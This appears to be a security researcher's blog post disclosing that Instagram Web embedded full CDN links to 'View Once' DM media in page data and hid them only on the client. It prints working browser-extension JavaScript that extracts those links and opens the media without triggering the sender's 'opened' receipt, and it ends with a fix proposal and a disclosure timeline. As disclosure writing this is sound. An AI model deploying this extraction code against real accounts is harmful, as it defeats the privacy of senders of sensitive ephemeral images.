---
title: "Vanishing Acts and Leaky Payloads: How Instagram Web Handed Over \"View Once\" Media in Plain Sight"
date: 2026-08-14
draft: false
summary: "Exposing Instagram's view-once mechanism."
---

Instagram's "View Once" feature makes a pretty simple promise of **ephmerphality**. If you send a sensitive photo or video in a thread, the other person looks at it once, for it to disappear forever. No replays or  screenshotting without a heads-up to you. Opening it in a browser that doesn't support the secure viewer, greets you with:

> *"This photo can only be replayed once. Use the mobile app to view."*

Sounds pretty secure, right? Except once you actually look at how Instagram Web handles this under the hood, the whole thing falls apart in a way that's honestly a little funny. The browser never really blocked the media. It was behind an unlocked door which you could push open to access the full, unredacted, high-resolution CDN URL to the media anytime.

---

## How "View Once" Was Supposed to Work

Instagram's disappearing-media system runs on an internal subsystem called **Raven** (Meta's cute lil' internal name for ephemeral camera and messaging features).

```
Sender (Mobile) ─────────► Meta Backend (Raven Service)
                              │
                              ├─► Recipient (Mobile): Secure Native Player (burn-on-read)
                              │
                              └─► Recipient (Web): "Use mobile app to view" (Fallback UI)
```

The flow for an ideal mechanism for "View Once" or "Allow Replay" attachments would be something like this:

1. The media gets uploaded to Meta's CDN (`scontent.cdninstagram.com`).
2. The message is flagged as ephemeral (`raven_media`).
3. On mobile, the app locks things down — blocking screenshots and screen recording using native platform protections like Android's [`FLAG_SECURE`](https://developer.android.com/reference/android/view/WindowManager.LayoutParams#FLAG_SECURE) window flag (which stops the OS itself from capturing that view in screenshots, screen recordings, or on non-secure external displays), alerting the sender if a capture somehow slips through anyway, and calling an endpoint the moment it's viewed to burn the token and mark the media "opened."
4. On web, where none of that screenshot-blocking or DRM magic is really possible, Instagram just... shouldn't show you the media and greet you with a fallback card instead.

To the normal user, it looks like the web client never even received the file. But inspecting the DOM and the network traffic reveals a pretty classic security mistake: **trusting the client to enforce access control over data the server already handed it.**

---

## The Flaw: Server-Side Over-Delivery & Client-Side Censorship

On opening an Instagram DM thread on the web, Instagram uses server-side rendering plus Relay/GraphQL payload hydration to make everything load instantly. For this server dumps the entire thread's state into the page's HTML and embedded JavaScript.

The problem is that instead of stripping out view-once attachment URLs for web requests, Meta's backend just... included the whole thing anyway:

1. **In DOM data attributes** — message elements were tagged with tags such as `data-raven-attachment` or `data-raven-message-id`.
2. **In serialized page scripts** — the server-rendered page source contained raw JSON calling `insertAttachment` with the entire attachment payload and CDN link:

```json
[
  "insertAttachment",
  "image/jpeg",
  "https://scontent.cdninstagram.com/v/t51.2885-15/...",
  "mid.$gABcDeFgHiJkLmNoPqRsTuVwXyZ"
]
```

The full media URL was just sitting there, quietly loaded into the browser's memory. The only thing standing between a malicious actor and the actual photo was a bit of React deciding to render a `<span>` that says *"Use the mobile app to view"* instead of an `<img>` tag. That's it. That's literally the whole security model.

---

## Anatomy of the Exploit

Once I understood where the flaw actually lived, I didn't need to build anything fancy. I just got Claude to cook up a quick little browser extension that did exactly what I needed: read the data the server had already leaked into the page, and build a tiny UI on top of it. Pretty low-tech as far as exploits go.

Here's the pipeline:

```
┌─────────────────────────────────────────────────────────────┐
│                      Instagram DM Thread                    │
└──────────────────────────────┬──────────────────────────────┘
                               │
                [1] DOM Mutation Observer Detects
                  Raven Selectors & Fallback Spans
                               │
                               ▼
        ┌──────────────────────────────────────────────┐
        │        Payload Discovery (Three Tiers)       │
        ├──────────────────────────────────────────────┤
        │ Tier 1: node.dataset.ravenAttachment         │
        │ Tier 2: Fetch Page HTML -> Regex Parsing     │
        │ Tier 3: Global Page insertAttachment Fallback│
        └──────────────────────┬───────────────────────┘
                               │
                               ▼
            [2] Inject Custom [Preview] Button
                               │
                               ▼
             [3] Extract Direct Meta CDN URL
                               │
                               ▼
          [4] Open in New Tab (Bypassing CORS & Burn)
```

### 1. Watching the DOM

It sets up a `MutationObserver` on `document.documentElement` to watch incoming DMs in real time, looking for two main selectors:

```javascript
const ATTACHMENT_SELECTOR = '[data-raven-attachment]';
const MESSAGE_ID_SELECTOR = '[data-raven-message-id]';
```

Once it spots a match, it walks up the DOM to find the message container and pull out the message ID (`mid.$...`).

### 2. Digging Out the Hidden CDN URL

This part happens in tiers, going from easiest to most involved.

**Tier A: it's just sitting in a data attribute**

Some builds of Instagram Web keep the raw attachment object right there in `data-raven-attachment`, which makes this almost too easy:

```javascript
function parseAttachment(node) {
  const raw = node.dataset.ravenAttachment;
  if (!raw) return null;
  try {
    const parsed = JSON.parse(raw);
    const url = parsed.playableUrl || parsed.url || parsed.src || parsed.downloadUrl || parsed.link;
    const mimeType = parsed.playableUrlMimeType || parsed.mimeType || '';
    return url ? { url, mimeType } : null;
  } catch (error) {
    return null;
  }
}
```

**Tier B: pulling it out of the page source**

On absence of the attribute, the data's still hiding in the page's Relay hydration scripts. So the extension just fetches the raw HTML using the user's own session (`credentials: 'include'`) and goes hunting:

```javascript
async function getAttachmentByMessageId(messageId) {
  const html = await getPageHtml();
  if (!html) return null;

  // Search for the serialized insertAttachment payload containing the message ID
  const regex = new RegExp('"insertAttachment"[^$]*"mid\\.\\$[^\"]*"', 'gm');
  const cleaned = html.replaceAll('\\', '');
  const matches = Array.from(cleaned.matchAll(regex));

  for (const match of matches) {
    try {
      const parsed = JSON.parse(`[${match[0]}]`).filter((item) => typeof item === 'string');
      const id = parsed.at(-1);
      const url = parsed.find((item) => typeof item === 'string' && item.startsWith('https://')) ?? null;
      const mimeType = parsed.find((item) => typeof item === 'string' && (item.startsWith('image/') || item.startsWith('video/'))) ?? '';
      
      if (id === messageId && url) {
        return { url, mimeType };
      }
    } catch (error) {}
  }
  return null;
}
```

Basically, it unwraps the `insertAttachment` tuples, matches the message ID, and out pops the pre-signed CDN link to the actual file.

### 3. Slipping In a "Preview" Button

Once a match is confirmed, the extension drops a small frosted-glass **Preview** button right into the chat bubble — nothing flashy, just enough to make the hidden option visible:

```javascript
const button = document.createElement('button');
button.type = 'button';
button.className = 'ig-view-once-preview-btn';
button.textContent = 'Preview';
button.style.cssText = [
  'padding: 4px 10px',
  'border-radius: 999px',
  'background: rgba(255,255,255,0.08)',
  'backdrop-filter: blur(10px)',
  'cursor: pointer'
].join(';');
```

### 4. Sidestepping CORS and the "Burn" Logic

Clicking **Preview** couldn't just `fetch()` the CDN URL directly as it would trip a CORS check. So instead, the extension did something simpler: it just opens the URL as a normal top-level navigation, which browsers don't subject to the same restrictions.

```javascript
async function openAttachment({ url, mimeType }) {
  if (!url) throw new Error('Missing URL');
  try {
    // Open direct CDN URL in a new tab; browser bypasses CORS on top-level navigation
    window.open(url, '_blank', 'noopener,noreferrer');
    return;
  } catch (err) {
    // Fallback: Create an in-memory blob URL
    const response = await fetch(url, { credentials: 'omit' });
    const blob = await response.blob();
    const objectUrl = URL.createObjectURL(blob);
    window.open(objectUrl, '_blank', 'noopener,noreferrer');
    setTimeout(() => URL.revokeObjectURL(objectUrl), 60000);
  }
}
```

Because the media is loaded straight from the CDN instead of going through Instagram's actual message-viewing API:

- **No "Opened" receipt** — the sender never finds out.
- **No expiration** — the link works as many times as the CDN signature stays valid.
- **No trace at all** — no sandbox, no screenshot detection, nothing.

---

## How This Matters

This falls under [CWE-602: Client-Side Enforcement of Server-Side Security](https://cwe.mitre.org/data/definitions/602.html) — a well-documented vulnerability that can slip through when a server is handing over data to the client.

| Expected Security Model | What Actually Happened |
| :--- | :--- |
| **Server-side authorization**: web clients requesting threads with ephemeral media should get a placeholder with no URLs attached. | **Client-side masking**: the server sends the complete CDN URL to every client, trusting the frontend not to render it. |
| **Just-in-time tokens**: the moment someone taps "view", an access token must be generated that gets burned right after. | **Static, pre-signed URLs**: URLs are present directly in the HTML payload. |

---

## How Meta Should Have Built It

None of this needed some crazy exotic engineering to fix. Just some basic defense:

1. **Strip the URLs server-side.** When the GraphQL/Relay serializer builds thread payloads for non-mobile clients (web, desktop), `raven_media` URLs should come back `null` or as a sentinel placeholder — never the real thing.

2. **Generate one-time URLs just in time.** Don't bake media links into bulk payloads at all. When a verified mobile client actually requests to view an ephemeral message, hit a dedicated endpoint (`/api/v1/direct_v2/media/view/`), issue a short-lived signed token (10 seconds is plenty), and immediately mark the message as burned server-side.

---

## Timeline of Disclosure

| Date | Event |
| :--- | :--- |
| Jun 1, 2026 | Report submitted. |
| Jul 9, 2026 | Sent a corrected, self-contained PoC along with an updated writeup and a PoC video.|
| Jul 21, 2026 | Meta responds: classifies View Once as a "best-effort" feature, not a hard security control. |
| Aug 4, 2026 | Meta closes the case as "Informative," maintaining it isn't a valid security/privacy issue, and points to the "someone could always use modified firmware/external means/etc to screen-record" scenario as reasoning. |
---

Cya all in the next post.
